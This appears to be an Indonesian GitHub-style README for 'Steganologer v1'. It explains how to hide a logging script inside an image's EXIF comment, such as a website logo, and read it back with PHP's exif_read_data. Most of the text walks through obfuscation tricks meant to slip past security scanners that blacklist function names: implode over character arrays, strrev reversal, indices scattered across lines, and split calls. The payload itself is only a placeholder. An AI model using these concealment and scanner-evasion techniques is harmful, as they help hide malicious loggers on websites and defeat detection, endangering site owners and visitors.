# Steganologer v1

Pada Steganologer versi 1 memanfaatkan exif metadata untuk menyisipkan script loger.
untuk membaca metadata suatu gambar anda bisa memakai function [exif_read_data()](http://php.net/manual/en/function.exif-read-data.php) dan [read_exif_data()](http://php.net/manual/en/function.read-exif-data.php) pada php.

Untuk memanipulasi exif metadata anda bisa menggunakan pothoshop,exifpilot dll pada sistem operasi windows, sedangkan pada linux anda bisa menggunakan exiftool.
Anda bisa menyisipkannya di logo atau icon pada website.

```
exiftool -Comment="scriptloger" filegambar.jpg
```

### Reader


```php
$steganologer = exif_read_data("bunglon.jpg");
echo $steganologer['COMMENT'][0];
```

### Bypass

bila scanner memblacklist kata [exif_read_data()](http://php.net/manual/en/function.exif-read-data.php) .
anda bisa mengakalinya dengan [read_exif_data()](http://php.net/manual/en/function.read-exif-data.php).

bila [read_exif_data()](http://php.net/manual/en/function.read-exif-data.php) juga di blasklist.
anda masih bisa membypassnya dengan array lalu di implode.
```php
implode("_",["exif","read","data"])("bunglon.jpg")
```

bila kata "exif" di blacklist juga maka bisa di bypass dengan membalikkan katanya menjadi "fixe" lalu manfaatkan function [strrev()](http://php.net/manual/en/function.strrev.php) di php.

dan bila kata fixe juga di blacklist maka bisa di bypass dengan manjadikan tiap hurufnya menjadi array
```php
implode("",["e","x","i","f","_","r","e","a","d","_","d","a","t","a"])("bunglon.jpg")
```
dan bila array berikut 
```
'"e","x","i","f","_","r","e","a","d","_","d","a","t","a"' 
```
di blacklist maka pecah saja menjadi
```php
$kata[] = "e";
$kata[] = "x";
$kata[] = "i";
$kata[] = "f";
$kata[] = "_";
$kata[] = "r";
$kata[] = "e";
$kata[] = "a";
$kata[] = "d";
$kata[] = "_";
$kata[] = "d";
$kata[] = "a";
$kata[] = "t";
$kata[] = "a";
```

lalu sebarkan di beda line script asal urutannya benar pasti functionnya kembali seperti semula namun bila takut tak urut maka masukan keynya saja sehingga menjadi seperti berikut ini

```php
$kata[0] = "e";
$kata[1] = "x";
$kata[2] = "i";
$kata[3] = "f";
$kata[4] = "_";
$kata[5] = "r";
$kata[6] = "e";
$kata[7] = "a";
$kata[8] = "d";
$kata[9] = "_";
$kata[10] = "d";
$kata[11] = "a";
$kata[12] = "t";
$kata[13] = "a";
```

lalu sebar sesuka anda dan di line berapa pun nanti ketika di implode akan kembali. 

```php
implode("",$kata)("bunglon.jpg")
```

bila scanner memblacklist ")(" maka bypass dengan  memisahkan function implode

```php
$implode = implode("",$kata);

echo $implode("bunglon.jpg")
```

masih banyak function php yang bisa di manfaatkan untuk bermain loger explore dan manfaatkan.